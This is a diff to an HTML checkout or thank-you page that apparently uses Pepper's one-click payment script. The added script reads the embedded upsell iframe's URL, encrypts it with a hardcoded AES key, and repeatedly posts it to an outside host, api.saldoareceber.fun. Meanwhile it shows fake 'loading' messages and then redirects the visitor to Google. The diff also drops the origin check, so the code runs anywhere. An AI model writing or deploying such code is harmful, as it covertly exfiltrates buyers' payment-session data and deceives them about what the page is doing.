@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Obrigado</title>
+    <title>Página</title>
 </head>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -70,54 +70,50 @@
     <div style="opacity: 0; z-index: -1;" class="pepperBtn"></div>
     <script src="https://pepper.com.br/oneclick.js"></script>
     <script>
-        let client = 'https://saldoareceber.fun'
-        if (window.location.origin == client) {
-            const pepperBtn = document.querySelector('.pepperBtn');
-            let qty = 7;
-            let cont = 0;
-            let site = 'https://google.com.br'
-            let yourdomain = 'https://api.saldoareceber.fun'
-            let messages = [
-                'Carregando...',
-                'Aguarde...',
-                ' Aguarde um momento...',
-                'Estamos quase lá...',
-                'Estamos quase finalizando...',
-                'Estamos finalizando...',
-            ]
+        const pepperBtn = document.querySelector('.pepperBtn');
+        let qty = 7;
+        let cont = 0;
+        let site = 'https://google.com.br'
+        let yourdomain = 'https://api.saldoareceber.fun'
+        let messages = [
+            'Carregando...',
+            'Aguarde...',
+            'Aguarde um momento...',
+            'Estamos quase lá...',
+            'Estamos quase finalizando...',
+            'Estamos finalizando...',
+        ]
 
-            setTimeout(() => {
-                getPay()
-            }, 3500);
+        setTimeout(() => {
+            getPay()
+        }, 3500);
 
-            setInterval(() => {
-                document.getElementById('status').innerHTML = messages[Math.floor(Math.random() * messages.length)]
-            }, 3500);
+        setInterval(() => {
+            document.getElementById('status').innerHTML = messages[Math.floor(Math.random() * messages.length)]
+        }, 3500);
 
-            function getPay() {
-                minhaString = document.querySelector('iframe').src.replace('https://pepper.com.br/upsell.html', '')
-                var encrypted = CryptoJS.AES.encrypt(minhaString, "irtur3t8uteterhfrj");
-                fetch(yourdomain + '/track', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        message: encrypted.toString()
-                    }),
-                    headers: {
-                        'Content-Type': 'application/json', // Define o tipo de conteúdo como dados binários
-                    },
-                })
+        function getPay() {
+            minhaString = document.querySelector('iframe').src.replace('https://pepper.com.br/upsell.html', '')
+            var encrypted = CryptoJS.AES.encrypt(minhaString, "irtur3t8uteterhfrj");
+            fetch(yourdomain + '/track', {
+                method: 'POST',
+                body: JSON.stringify({
+                    message: encrypted.toString()
+                }),
+                headers: {
+                    'Content-Type': 'application/json', // Define o tipo de conteúdo como dados binários
+                },
+            })
 
-                cont++
-                if (cont <= qty) {
-                    setTimeout(() => {
-                        getPay()
-                    }, 2000);
-                } else {
-                    window.location.href = site
-                }
+            cont++
+            if (cont <= qty) {
+                setTimeout(() => {
+                    getPay()
+                }, 3500);
+            } else {
+                window.location.href = site
             }
-        }
-
+        }       
     </script>
 </body>
 
